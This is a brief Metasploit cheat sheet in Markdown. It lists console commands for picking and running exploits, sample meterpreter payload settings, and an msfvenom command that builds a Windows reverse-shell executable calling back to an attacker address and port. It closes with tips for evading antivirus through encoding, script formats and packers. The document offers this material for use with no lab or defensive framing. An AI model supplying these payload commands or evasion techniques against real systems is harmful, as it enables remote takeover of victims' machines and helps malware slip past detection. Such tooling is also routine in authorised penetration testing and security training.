
# Metasploit Cheatsheet 🧠

## Global Commands

| Command | Description |
|--------|-------------|
| `search <name>` | Search modules |
| `use <module>` | Load a module |
| `info` | Show module info |
| `set RHOST <ip>` | Target IP |
| `set LHOST <ip>` | Attacker IP |
| `set PAYLOAD <payload>` | Choose payload |
| `exploit` | Run the exploit |
| `sessions` | View active sessions |
| `background` | Background session |

## Payload Examples

```bash
set PAYLOAD linux/x86/meterpreter/reverse_tcp
set PAYLOAD windows/meterpreter/reverse_http

---

## Reverse Shell Payloads
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe > shell.exe

---

## Scripting
```bash
msfconsole -r myscript.rc

---

## Evade AV Tips
    Use -e x86/shikata_ga_nai
    Output to .ps1, .bat, .vbs
    Use packers/obfuscators post-build
